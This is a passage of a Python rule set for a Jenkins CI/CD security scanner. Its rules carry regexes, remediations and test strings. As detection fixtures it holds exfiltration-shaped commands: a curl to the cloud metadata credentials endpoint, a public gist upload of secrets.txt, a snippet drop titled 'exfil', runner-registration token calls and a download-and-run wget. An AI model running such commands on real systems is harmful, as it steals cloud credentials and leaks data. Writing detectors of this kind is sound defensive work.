            "withCredentials([sshUserPrivateKey(credentialsId: 'deploy-key', keyFileVariable: 'KEY_FILE')]) {\n"
            "    sh 'ssh -i \"$KEY_FILE\" user@host ./deploy.sh'\n"
            "}\n\n"
            "If writeFile is unavoidable, always delete in a finally block:\n"
            "try {\n"
            "    writeFile file: '/tmp/deploy.pem', text: pemContent\n"
            "    sh 'ssh -i /tmp/deploy.pem user@host ./deploy.sh'\n"
            "} finally {\n"
            "    sh 'rm -f /tmp/deploy.pem'\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials",
        test_positive=[
            "writeFile file: 'deploy.pem', text: privateKeyContent",
            "writeFile(file: '/tmp/id_rsa', text: env.SSH_PRIVATE_KEY)",
            "writeFile file: 'server.p12', text: keystoreData",
        ],
        test_negative=[
            "writeFile file: 'config.json', text: configContent",
            "writeFile file: 'README.md', text: 'Build completed'",
            "// writeFile file: 'deploy.pem', text: key",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "Private key material written to the workspace persists on the Jenkins agent's "
            "disk between builds on permanent agents and may be inadvertently archived if "
            "artifact glob patterns are too broad. Other pipelines running on the same "
            "agent can read workspace files from prior jobs, exposing the key material to "
            "any build that runs on that node."
        ),
    ),
    # =========================================================================
    # SEC6-JK-007: bat step with Groovy string interpolation of params/env
    # =========================================================================
    Rule(
        id="SEC6-JK-007",
        title="Windows bat step uses Groovy string interpolation of user-controlled value",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkins pipeline bat (Windows batch) step uses Groovy double-quoted string "
            "interpolation to embed a user-controlled value (params.* or env.*) directly "
            "into the command. Groovy resolves the interpolation before cmd.exe sees the "
            "command — on Windows this enables injection via & | > < and similar "
            "metacharacters. This is the Windows equivalent of the shell injection risk "
            "covered by SEC4-JK-001 and SEC4-JK-002."
        ),
        pattern=RegexPattern(
            match=r'bat\s+["\'].*\$\{?\s*(?:params|env)\.',
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Pass values via withEnv to avoid inline Groovy interpolation:\n\n"
            "// BAD\n"
            'bat "msbuild ${params.PROJECT} /t:Build"\n\n'
            "// GOOD\n"
            'withEnv(["PROJECT=${params.PROJECT}"]) {\n'
            "    bat 'msbuild %PROJECT% /t:Build'\n"
            "}"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution",
        test_positive=[
            'bat "msbuild ${params.PROJECT_FILE} /t:Build"',
            'bat "nuget restore ${env.SOLUTION_PATH}"',
        ],
        test_negative=[
            "bat 'msbuild solution.sln /t:Build'",
            '// bat "msbuild ${params.PROJECT_FILE}"',
        ],
        stride=["T", "E"],
        threat_narrative=(
            "Groovy GString interpolation inside a bat() call evaluates ${variable} before "
            "the Windows shell sees the command, inserting user-controlled values directly "
            "into the command string without any quoting protection. An attacker who "
            "controls the interpolated parameter can inject CMD metacharacters that execute "
            "arbitrary commands on the Windows build agent."
        ),
    ),
    # =========================================================================
    # SEC7-JK-002: Scripted pipeline node block without label
    # =========================================================================
    Rule(
        id="SEC7-JK-002",
        title="Scripted pipeline node block without agent label — runs on any available node",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "A scripted Jenkins pipeline uses `node { }` or `node() { }` without specifying "
            "an agent label. This is the scripted-pipeline equivalent of `agent any` "
            "(covered by SEC7-JK-001 for declarative pipelines) — the build can run on "
            "any connected agent, including untrusted cloud spot instances or agents "
            "shared with other teams. In mixed-trust environments, sensitive pipelines "
            "must be constrained to known, trusted nodes."
        ),
        pattern=_NodeBlockWithoutLabelPattern(),
        remediation=(
            "Specify an agent label:\n\n"
            "// BAD\n"
            "node {\n    stage('Build') { sh 'make' }\n}\n\n"
            "// GOOD\n"
            "node('trusted-linux') {\n    stage('Build') { sh 'make' }\n}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#scripted-pipeline",
        test_positive=[
            "node {\n    stage('Build') { sh 'make' }\n}",
            "node() {\n    checkout scm\n    sh './build.sh'\n}",
        ],
        test_negative=[
            "node('linux') {\n    sh 'make'\n}",
            "node('docker') {\n    docker.image('ubuntu:22.04').inside { sh 'make' }\n}",
            "// node {\n//   sh 'make'\n// }",
            # Declarative agent's nested node block — label on a later line.
            # Surfaced as 3/3 FP in the Jenkins n=40 round-2 review (Kong build-tools).
            "agent {\n    node {\n        label 'bionic'\n    }\n}",
            "agent {\n    node {\n        label 'linux-benchmark-node'\n        customWorkspace '/foo'\n    }\n}",
        ],
        stride=["E", "T"],
        threat_narrative=(
            "A node() block without a label constraint runs on any available Jenkins agent, "
            "including nodes with elevated cloud or production credentials that the "
            "scripted pipeline does not require. Labelling nodes with their permission "
            "scope and matching pipeline labels to that scope enforces least-privilege for "
            "build execution."
        ),
    ),
    # =========================================================================
    # SEC7-JK-003: docker.withRegistry with null credentials
    # =========================================================================
    Rule(
        id="SEC7-JK-003",
        title="docker.withRegistry called with null credentials — unauthenticated registry push",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "A Jenkins pipeline calls docker.withRegistry() with null as the credentials "
            "argument, disabling registry authentication. On registries that allow "
            "unauthenticated pushes (some self-hosted or misconfigured registries), this "
            "can overwrite images that are then pulled by other pipelines or production "
            "deployments — an image replacement attack with no identity trail."
        ),
        pattern=RegexPattern(
            match=r"docker\.withRegistry\s*\([^)]*,\s*null\s*\)",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Always provide a credentials ID:\n\n"
            "// BAD\n"
            "docker.withRegistry('https://registry.example.com', null) { docker.build('myapp').push() }\n\n"
            "// GOOD\n"
            "docker.withRegistry('https://registry.example.com', 'registry-creds') { docker.build('myapp').push() }"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/docker/#custom-registry",
        test_positive=[
            "docker.withRegistry('https://registry.example.com', null) { docker.build('myapp').push() }",
            'docker.withRegistry("https://${REGISTRY}", null) { image.push() }',
        ],
        test_negative=[
            "docker.withRegistry('https://registry.example.com', 'my-creds') { docker.build('myapp').push() }",
            "// docker.withRegistry('https://registry.example.com', null)",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "docker.withRegistry() called with null credentials authenticates anonymously "
            "to the registry, meaning pushed images have no access control and are "
            "accessible to anyone who can reach the registry endpoint. On internal "
            "registries, anonymous pushes also make it impossible to audit which build "
            "published which image, breaking the provenance chain."
        ),
    ),
    # =========================================================================
    # SEC8-JK-003: Git checkout from HTTP (non-HTTPS) URL
    # =========================================================================
    Rule(
        id="SEC8-JK-003",
        title="Git repository checked out from non-HTTPS URL — susceptible to MITM code injection",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline checks out source code from a plain HTTP URL. HTTP "
            "connections are unencrypted — a network-level attacker can inject malicious "
            "code into the source tree before the build runs, insert compromised "
            "dependencies, or replace downloaded scripts without any visible error."
        ),
        pattern=RegexPattern(
            match=r"(?:url\s*:\s*['\"]http://|git\s+clone\s+http://)(?!localhost|127\.0\.0\.1)",
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Replace HTTP with HTTPS for all repository URLs:\n\n"
            "// BAD\n"
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'http://github.com/org/repo.git']]])\n\n"
            "// GOOD\n"
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'https://github.com/org/repo.git']]])"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#checkout",
        test_positive=[
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'http://github.com/org/repo.git']]])",
            "sh 'git clone http://gitlab.example.com/group/project.git'",
        ],
        test_negative=[
            "checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'https://github.com/org/repo.git']]])",
            "checkout scm",
            "// url: 'http://github.com/org/repo.git'",
        ],
        stride=["T", "I"],
        threat_narrative=(
            "Checking out from a non-HTTPS URL (git:// or http://) sends the repository "
            "contents over an unencrypted connection susceptible to MITM attacks that can "
            "inject malicious code into the checkout. For private repositories, credentials "
            "transmitted over an unencrypted channel are also exposed to any observer on "
            "the network path."
        ),
    ),
    # =========================================================================
    # SEC9-JK-003: wget download without checksum verification
    # =========================================================================
    Rule(
        id="SEC9-JK-003",
        title="wget downloads binary or script without checksum verification",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-9",
        description=(
            "A Jenkins pipeline shell step uses wget to download a binary, archive, or "
            "script file but does not verify its integrity with a checksum. "
            "If the download source is compromised (CDN hijack, DNS poisoning, supply chain "
            "attack), the malicious file runs with full build environment access. "
            "SEC9-JK-001 covers the curl|bash pattern; this rule covers the wget case "
            "where the file is downloaded and later executed without a sha256sum step."
        ),
        pattern=SequencePattern(
            pattern_a=r"sh\s+['\"\{]{1,3}[^'\"\}]*wget\s+.*\.(sh|py|tar\.gz|tgz|zip|exe|bin|deb|rpm)\b",
            absent_within=r"(sha256sum|sha512sum|shasum|md5sum|cosign|gpg\s+--verify)",
            lookahead_lines=5,
            exclude=[r"^\s*//"],
            groovy_comment_aware=True,
        ),
        remediation=(
            "Verify the checksum before executing any downloaded file:\n\n"
            "// BAD\n"
            "sh 'wget -q https://releases.example.com/tool-v2.0.tar.gz'\n"
            "sh 'tar xzf tool-v2.0.tar.gz && ./tool-v2.0/install.sh'\n\n"
            "// GOOD\n"
            "sh '''\n"
            "    wget -q https://releases.example.com/tool-v2.0.tar.gz\n"
            "    echo 'abc123def456...  tool-v2.0.tar.gz' | sha256sum --check\n"
            "    tar xzf tool-v2.0.tar.gz && ./tool-v2.0/install.sh\n"
            "'''"
        ),
        reference="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation",
        test_positive=[
            "sh 'wget -q https://releases.example.com/tool-v2.0.tar.gz'",
            "sh 'wget https://example.com/install.sh && bash install.sh'",
        ],
        test_negative=[
            "sh '''\n    wget -q https://example.com/tool.tar.gz\n    echo \"abc123  tool.tar.gz\" | sha256sum --check\n'''",
            "// sh 'wget https://example.com/install.sh'",
            "/* docs only:\n * sh 'wget https://example.com/install.sh && bash install.sh'\n */",
        ],
        stride=["T"],
        threat_narrative=(
            "wget downloading a binary or script without checksum verification allows a "
            "compromised server or intercepted connection to silently substitute a "
            "malicious payload. The pipeline then executes attacker-controlled code with "
            "access to the Jenkins agent's credentials and build environment."
        ),
    ),
    # =========================================================================
    # SEC1-JK-002: No timeout in declarative pipeline
    # =========================================================================
    Rule(
        id="SEC1-JK-002",
        title="Declarative pipeline has no timeout — runaway build holds agents and credentials indefinitely",
        severity=Severity.LOW,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-1",
        description=(
            "A Jenkins declarative pipeline does not contain any timeout() step or option. "
            "Without a timeout, a hung or looping build step holds the agent indefinitely, "
            "keeps credentials bound in memory via withCredentials blocks, and prevents "
            "other builds from running. A DoS via crafted code that hangs can block the "
            "entire CI pipeline. Timeouts are also a control against runaway deployments "
            "that partially apply infrastructure changes."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*pipeline\s*\{",
            absent_within=r"\btimeout\s*\(",
            lookahead_lines=250,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Add a pipeline-level timeout in the options block:\n\n"
            "pipeline {\n"
            "    options {\n"
            "        timeout(time: 30, unit: 'MINUTES')\n"
            "    }\n"
            "    ...\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#options",
        test_positive=[
            "pipeline {\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n}",
        ],
        test_negative=[
            "pipeline {\n  options { timeout(time: 30, unit: 'MINUTES') }\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n}",
            "stage('Build') { steps { timeout(time: 5, unit: 'MINUTES') { sh 'make' } } }",
        ],
        stride=["D", "R"],
        threat_narrative=(
            "Without a global timeout, a compromised or hung step can hold the Jenkins "
            "executor and any bound credentials indefinitely, blocking legitimate builds "
            "and exfiltrating secrets for as long as the runner allows. An explicit timeout "
            "bounds the impact and makes anomalous build durations immediately "
            "visible in the Jenkins dashboard."
        ),
    ),
    # =========================================================================
    # SEC10-JK-001: No post { always } block in declarative pipeline
    # =========================================================================
    Rule(
        id="SEC10-JK-001",
        title="Declarative pipeline has no post { always { } } block — no guaranteed cleanup or audit trail",
        severity=Severity.LOW,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-10",
        description=(
            "A Jenkins declarative pipeline does not contain a post { always { ... } } "
            "block. Without this, there is no guaranteed cleanup or audit logging step "
            "that runs regardless of whether the pipeline succeeds or fails. "
            "In security-sensitive pipelines, post { always } is used to delete temporary "
            "credential files from the workspace, report pipeline completion to a SIEM, "
            "send failure notifications, and clean up test deployments. The absence of "
            "cleanup creates a window where credential files or sensitive artifacts persist "
            "on the agent after a failed build."
        ),
        pattern=SequencePattern(
            pattern_a=r"^\s*pipeline\s*\{",
            absent_within=r"\bpost\s*\{",
            lookahead_lines=250,
            exclude=[r"^\s*//"],
        ),
        remediation=(
            "Add a post block with an always section:\n\n"
            "pipeline {\n"
            "    ...\n"
            "    post {\n"
            "        always {\n"
            "            cleanWs()\n"
            "            sh 'rm -f /tmp/*.pem /tmp/*.key'\n"
            "        }\n"
            "        failure {\n"
            '            slackSend message: "Pipeline failed: ${env.BUILD_URL}"\n'
            "        }\n"
            "    }\n"
            "}"
        ),
        reference="https://www.jenkins.io/doc/book/pipeline/syntax/#post",
        test_positive=[
            "pipeline {\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n}",
        ],
        test_negative=[
            "pipeline {\n  agent any\n  stages {\n    stage('Build') { steps { sh 'make' } }\n  }\n  post { always { cleanWs() } }\n}",
        ],
        stride=["R"],
        threat_narrative=(
            "Without a post { always { } } block there is no guaranteed cleanup path — "
            "temporary credentials written to disk, debug artifacts, or sensitive workspace "
            "files may persist on the agent between builds. post { always } is also where "
            "audit logging hooks, notification steps, and forensic artifact uploads should "
            "live; omitting it silently removes the audit trail."
        ),
    ),
    # =========================================================================
    # SEC7-JK-004 — Docker registry accessed over cleartext HTTP.
    # SEC7-JK-003 catches ``docker.withRegistry(url, null)`` (anonymous push);
    # this catches the orthogonal transport problem: an ``http://`` registry
    # URL.  SEC8-JK-003's ``url: 'http://'`` matcher does NOT see the
    # ``withRegistry('http://...')`` positional-arg form (the registry URL is
    # not a ``url:`` key) and ``registryUrl`` has no lowercase ``url:`` token,
    # so there is no double-fire.  localhost / 127.0.0.1 are excluded (local
    # dev registries).
    # =========================================================================
    Rule(
        id="SEC7-JK-004",
        finding_family="insecure_transport",
        title="Docker registry accessed over cleartext HTTP",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-7",
        description=(
            "A pipeline points Docker at a registry over plain ``http://`` "
            "(``docker.withRegistry('http://...')`` or ``registryUrl: "
            "'http://...'``). Registry traffic carries the credential used to "
            "authenticate and the image layers being pushed/pulled. Over "
            "cleartext, a network MITM can steal the registry credential and "
            "substitute a backdoored image layer that later pipelines pull and "
            "run. Use HTTPS so the registry endpoint is authenticated and the "
            "session encrypted."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:withRegistry\s*\(\s*['\"]http://|registryUrl\s*:\s*['\"]http://)"
                r"(?!localhost|127\.0\.0\.1)"
            ),
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Use an HTTPS registry endpoint:\n\n"
            "// BAD\n"
            "docker.withRegistry('http://nexus:8081', 'registry-creds') { ... }\n\n"
            "// GOOD\n"
            "docker.withRegistry('https://nexus.example.com', 'registry-creds') { ... }\n\n"
            "If the registry only speaks HTTP on the internal network, terminate "
            "TLS at a reverse proxy rather than sending credentials in clear."
        ),
        reference="https://docs.docker.com/reference/cli/dockerd/#insecure-registries",
        test_positive=[
            "docker.withRegistry('http://nexus:8081', 'registry-creds') { sh 'docker push x' }",
            'docker.withRegistry("http://registry.internal", "id")',
        ],
        test_negative=[
            "docker.withRegistry('https://registry.internal', 'registry-creds') { }",
            # Local dev registry — excluded.
            "docker.withRegistry('http://localhost:5000', 'registry-creds')",
            "// docker.withRegistry('http://nexus', 'creds')",
        ],
        stride=["I", "T"],
        threat_narrative=(
            "A cleartext registry connection exposes both the authentication "
            "credential and the image bytes to anyone on the path. An attacker "
            "harvests the registry credential and can push a backdoored layer; "
            "downstream pipelines that pull from the same registry then execute "
            "the attacker's image with the build's privileges."
        ),
    ),
    # =========================================================================
    # SEC6-JK-008: Exfil-shaped primitive in Jenkinsfile sh step.
    # Jenkins port of SEC6-GH-008 (Wiz prt-scan class, April 2026).
    #
    # Jenkins has no native `gh gist` integration the way GitHub
    # Actions does, so the IOC set is narrower than GH's — and less
    # niche: Jenkins agents are self-hosted by default, so the IMDS
    # and runner-registration primitives directly apply.  Primitives:
    #
    #   (a) IMDS via curl/wget — 169.254.169.254 / [fd00:ec2::254].
    #       On self-hosted cloud runners (EC2 / GCE / Azure VM)
    #       IMDS returns temporary instance-role credentials.  Jenkins
    #       deployments very commonly live on self-hosted cloud VMs,
    #       making this the highest-signal IOC on the platform.
    #   (b) gh gist / gh api /gists — less common on Jenkins (agents
    #       don't typically have `gh` installed) but when present, a
    #       direct analog of the GH rule's primitive.
    #   (c) glab snippet / glab api /snippets — Jenkins builds of
    #       GitLab-hosted projects may have `glab` installed.
    #   (d) Explicit POST to /actions/runners/registration-token
    #       (GitHub self-hosted runner enrollment).  A Jenkins
    #       pipeline that enrols a GH runner is an ops pattern; on
    #       fork-reachable triggers it becomes a runner-hijack
    #       primitive.
    #
    # File-scoped because the Jenkinsfile is one segment.
    # =========================================================================
    Rule(
        id="SEC6-JK-008",
        title=(
            "Exfil-shaped primitive in Jenkinsfile sh step "
            "(IMDS / gist / snippet / runner-register)"
        ),
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-6",
        description=(
            "A Jenkinsfile ``sh '...'`` step invokes a primitive that "
            "matches the exfiltration signature used by the Wiz-"
            "disclosed prt-scan campaign (April 2026) and the "
            "Stawinski PyTorch / Praetorian self-hosted-runner "
            "compromises:\n"
            "  - ``curl 169.254.169.254`` / ``wget 169.254.169.254`` "
            "(and IPv6 ``[fd00:ec2::254]``) — IMDS on cloud-compute "
            "agents yields temporary instance-role credentials.  "
            "Jenkins deployments are usually self-hosted on cloud "
            "VMs, which makes this the highest-signal IOC on the "
            "platform.\n"
            "  - ``gh gist create`` / ``gh api /gists`` — public-"
            "gist drop channel.\n"
            "  - ``glab snippet create`` / ``glab api`` targeting "
            "``/snippets`` — GitLab-snippet drop channel when the "
            "agent has ``glab`` installed.\n"
            "  - ``curl -X POST .../actions/runners/registration-"
            "token`` — GitHub self-hosted runner enrolment.  On "
            "fork-reachable triggers lets an attacker register "
            "their own machine as a runner for the victim's org.\n"
            "Each primitive has legitimate uses; the rule surfaces "
            "presence for reviewer verification.  Signal is "
            "especially high when the Jenkinsfile also references "
            "PR-context variables (``env.CHANGE_*`` / ``ghprb*``)."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # IMDS — IPv4 + IPv6
                r"\b(?:curl|wget|http)\s+[^#\n]*169\.254\.169\.254"
                r"|\b(?:curl|wget|http)\s+[^#\n]*\[fd00:ec2::254\]"
                # gh gist drop channels
                r"|\bgh\s+gist\s+create\b"
                r"|\bgh\s+api\s+/gists\b"
                # glab snippet drop channels
                r"|\bglab\s+snippet\s+create\b"
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*"
                r"/snippets\b"
                # gh runner registration token — GH self-hosted runner.
                # Allow `-X POST` / `--method POST` / flags between `gh api`
                # and the path (common shape on Jenkins where the whole
                # command is a one-liner inside `sh '...'`).
                r"|\bgh\s+api\b[^#\n]*/actions/runners/(?:registration|remove)-token"
                r"|\b(?:curl|wget)\s+[^#\n]*/actions/runners/registration-token"
                # glab runner registration via curl or glab api
                r"|\bglab\s+api\s+(?:-X\s+POST\s+|--method\s+POST\s+)[^\n#]*/runners\b"
                r")"
            ),
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
            ],
        ),
        remediation=(
            "Per-primitive remediation (same shape as SEC6-GH-008):\n"
            "  - `curl 169.254.169.254` (IMDS) — if the pipeline runs\n"
            "    on a self-hosted cloud agent, narrow the instance\n"
            "    role (single ARN, not `*:*`), require IMDSv2, set\n"
            "    hop-limit 1.  Prefer federated credentials (AWS\n"
            "    IRSA / GCP workload identity / Azure MI) over\n"
            "    instance roles where feasible.  Never query IMDS\n"
            "    from a PR-triggered build.\n"
            "  - `gh gist create` / `glab snippet create` — use a\n"
            "    tagged release + `gh release upload` /\n"
            "    `glab release upload` instead.  Snippets and gists\n"
            "    default to public / project-visible and leak the\n"
            "    data to anyone with the URL.\n"
            "  - Runner registration-token POST — only legitimate\n"
            "    in an ops pipeline.  On Multibranch / PR-builder\n"
            "    triggers the primitive lets an attacker register\n"
            "    their own machine and hijack future jobs on the\n"
            "    runner label.  Move to a main-branch-only stage\n"
            "    with a Jenkins `input()` approval gate.\n"
            "Run `taintly --guide SEC6-GH-008` for the full\n"
            "checklist (the GH guide applies directly — Jenkins\n"
            "has the same IOC classes)."
        ),
        reference=(
            "https://www.wiz.io/blog/six-accounts-one-actor-inside-the-prt-scan-supply-chain-campaign; "
            "https://safedep.io/prt-scan-github-actions-exfiltration-campaign/; "
            "https://johnstawinski.com/2024/01/11/playing-with-fire-how-we-executed-a-critical-supply-chain-attack-on-pytorch/; "
            "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-options.html"
        ),
        test_positive=[
            # IMDS curl inside sh step
            "node { sh 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/' }",
            # IMDS wget
            "pipeline { agent any; stages { stage('x') { steps { sh 'wget -q -O - http://169.254.169.254/' } } } }",
            # gh gist drop
            "node { sh 'gh gist create secrets.txt --public' }",
            # glab snippet drop
            "node { sh 'glab snippet create --title exfil --content @data.json' }",
            # Runner registration token via gh api
            "node { sh 'gh api /repos/org/repo/actions/runners/registration-token' }",
            # Runner registration via glab
            "node { sh 'glab api -X POST /runners -F token=$TOK' }",
        ],
        test_negative=[
            # gh release upload — legitimate
            "node { sh 'gh release upload v1.0 dist/artifact.zip' }",
            # IMDS IP mentioned in a comment
            "node { // IMDS is at 169.254.169.254 — don't curl it\n    sh 'make build' }",
            # Plain curl to a normal URL
            "node { sh 'curl https://api.example.com/health' }",
            # gh api read (GET, no POST)
            "node { sh 'gh api /user' }",
            # Runner list (GET, not registration-token POST)
            "node { sh 'gh api /repos/o/r/actions/runners' }",
            # Commented out — line-leading `//` is the Groovy idiom our
            # `^\s*//` exclude catches.  Block comments `/* ... */` that
            # span or embed a mid-line anchor are a known limitation of
            # the line-based scan and would need a Groovy tokenizer.
            "node {\n    // sh 'curl 169.254.169.254'\n    sh 'echo hi'\n}",
        ],
        stride=["I", "E", "R"],
        threat_narrative=(
            "Jenkins' self-hosted default makes IMDS the sharpest "
            "primitive in the exfil set.  A Jenkins agent running "
            "on an EC2 instance with an instance profile can query "
            "``http://169.254.169.254/latest/meta-data/iam/"
            "security-credentials/`` and receive temporary AWS "
            "credentials for whatever role the instance holds.  "
            "On an agent whose role is overly-scoped (`*:*`, or "
            "broad production bucket access), this becomes the "
            "cloud-account pivot.  Stawinski's PyTorch post-mortem "
            "(Jan 2024) and the Praetorian TensorFlow write-up "
            "document IMDS + runner-registration as the chain for "
            "self-hosted-runner compromise — a chain that applies "
            "identically to Jenkins agents."
        ),
        confidence="low",
        incidents=[
            "prt-scan (Wiz, Apr 2026) — GH analog",
            "PyTorch supply chain (Stawinski, Jan 2024) — GH analog",
            "TensorFlow self-hosted runner (Praetorian, 2024) — GH analog",
        ],
    ),
    # =========================================================================
    # SEC3-JK-004: pip --extra-index-url without --index-url — dependency
    # confusion.  Jenkins port of SEC3-GH-008 / SEC3-GL-004.  The resolver
    # bug is a pip property (highest-version-wins merge across indexes), so
    # the attack class is identical on any platform that shells out to pip.
    # Incident reference: PyTorch dependency confusion, December 2022.
    # =========================================================================
    Rule(
        id="SEC3-JK-004",
        title="pip --extra-index-url used without --index-url (dependency confusion, Jenkins)",
        severity=Severity.MEDIUM,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-3",
        description=(
            "A Jenkins pipeline shell step invokes pip install with "
            "``--extra-index-url`` (adds a secondary index) without "
            "``--index-url`` (replaces the primary).  pip's resolver "
            "merges both indexes with highest-version-wins semantics, "
            "and public PyPI names are first-party-registerable.  An "
            "attacker who registers your private package name on "
            "public PyPI with a higher version number wins the "
            "resolution — the PyTorch dependency-confusion incident "
            "of December 2022 used this exact shape."
        ),
        pattern=RegexPattern(
            match=r"pip\s+install[^\n]*--extra-index-url",
            exclude=[
                r"^\s*//",
                r"^\s*\*",
                r"^\s*#",
                # Paired with --index-url is the safe form.
                r"--index-url\b(?!\s*=?\s*https?://pypi\.org)",
            ],
        ),
        remediation=(
            "Use --index-url to point pip at your private index\n"
            "exclusively, and mirror required public packages into it.\n"
            "If you must consult public PyPI, use a tool that supports\n"
            "explicit package-to-index pinning (uv, poetry's source\n"
            "priority='explicit', or pip-tools with hash-locking):\n\n"
            "// BAD — public PyPI can win resolution for private names\n"
            "sh 'pip install --extra-index-url https://pypi.internal.corp/ mypackage'\n\n"
            "// GOOD — only the private index is consulted; mirror\n"
            "// public packages into it via Artifactory or Nexus\n"
            "sh 'pip install --index-url https://pypi.internal.corp/ mypackage'"
        ),
        reference="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610",
        test_positive=[
            "sh 'pip install --extra-index-url https://pypi.internal.corp/ mypackage'",
            'sh "pip install -r requirements.txt --extra-index-url https://internal/"',
        ],
        test_negative=[
            "sh 'pip install --index-url https://pypi.internal.corp/ mypackage'",
            "// legacy: pip install --extra-index-url https://internal/",
            "sh 'pip install requests'",
        ],
        stride=["T", "S"],
        threat_narrative=(
            "Dependency confusion exploits pip's permissive resolver: "
            "when a private package name is also registerable on public "
            "PyPI, an attacker uploads a same-named package with a "
            "higher version number and pip silently prefers it.  The "
            "malicious package's install hooks execute as the build "
            "user with access to any ``withCredentials`` scope active "
            "at install time and the Jenkins agent's SCM credentials."
        ),
        incidents=["PyTorch dependency confusion (Dec 2022, GH analog)"],
    ),
    # =========================================================================
    # SEC8-JK-004: Docker agent with `args '--privileged'` — container
    # escape primitive.  Jenkins port of SEC8-GH-004.  Declarative pipeline
    # form: ``agent { docker { image '...' args '--privileged' } }``.
    # Scripted form: ``docker.image('...').inside('--privileged')`` or
    # ``docker.image('...').withRun('--privileged')``.  A privileged
    # container has full kernel capability access and can escape its
    # namespace — on a non-ephemeral Jenkins agent this persists across
    # subsequent builds that land on the same host.
    # =========================================================================
    Rule(
        id="SEC8-JK-004",
        title="Docker agent or container run with --privileged (container escape primitive)",
        severity=Severity.HIGH,
        platform=Platform.JENKINS,
        owasp_cicd="CICD-SEC-8",
        description=(
            "A Jenkins pipeline starts a Docker agent or container "
            "with the ``--privileged`` flag — either as "
            "``agent { docker { image '...' args '--privileged' } }`` "
            "in declarative syntax, or as "
            "``docker.image('...').inside('--privileged') { ... }`` / "
            "``docker.image('...').withRun('--privileged') { ... }`` "
            "in scripted syntax.  Privileged containers have full "
            "access to all Linux kernel capabilities and host devices: "
            "they can mount the host filesystem, escape the container "
            "namespace, load kernel modules, and interact with the "
            "Docker socket.\n"
            "\n"
            "Unlike GitHub-hosted runners (ephemeral single-job VMs), "
            "Jenkins agents are typically long-lived and shared across "
            "builds — a container escape on one build persists across "
            "subsequent builds that land on the same agent, poisoning "
            "future workflows and exposing their credentials.  Most "
            "build use cases (compile, test, package) work correctly "
            "without ``--privileged``."
        ),
        pattern=RegexPattern(
            match=(
                r"(?:"
                # Declarative: `args '--privileged'` / `args \"--privileged\"`
                r"\bargs\s+['\"][^'\"]*--privileged\b"
                # Scripted: `.inside('--privileged')` / `.withRun('--privileged')`
                r"|\.(?:inside|withRun)\s*\(\s*['\"][^'\"]*--privileged\b"
                # Shell-level docker run (occasionally seen in Jenkinsfiles).
                r"|\bdocker\s+run\b[^\n]*--privileged\b"
                r")"
            ),
            exclude=[r"^\s*//", r"^\s*\*"],
        ),
        remediation=(
            "Remove the --privileged flag.  Most build containers don't\n"
            "need it.  If your build genuinely requires elevated\n"
            "capabilities (e.g., binfmt_misc for cross-arch builds),\n"
            "request only the specific Linux capability it needs:\n\n"
            "// BAD\n"
            "agent { docker { image 'builder:1.0' args '--privileged' } }\n\n"
            "// GOOD — narrow capability instead of full privilege\n"
            "agent { docker { image 'builder:1.0' args '--cap-add=SYS_PTRACE' } }\n\n"
            "If the build step must run on a Docker-in-Docker setup\n"
            "(building images), isolate it to a dedicated, ephemeral\n"
            "Jenkins agent node whose host is not shared with other\n"
            "pipelines — a container escape there can't reach builds\n"
            "running elsewhere."
        ),
        reference="https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities",
        test_positive=[
            # Declarative single-quoted args.
            "agent { docker { image 'ubuntu:22.04' args '--privileged' } }",
            # Declarative multi-flag args.
            "agent { docker { image 'builder' args '-v /tmp:/tmp --privileged' } }",
            # Scripted .inside()
            "docker.image('ubuntu:22.04').inside('--privileged') { sh 'make' }",
            # Scripted .withRun()
            "docker.image('builder').withRun('--privileged --rm') { c -> sh 'work' }",
            # Shell-level docker run.
            "sh 'docker run --privileged --rm ubuntu:22.04 make'",
        ],
        test_negative=[
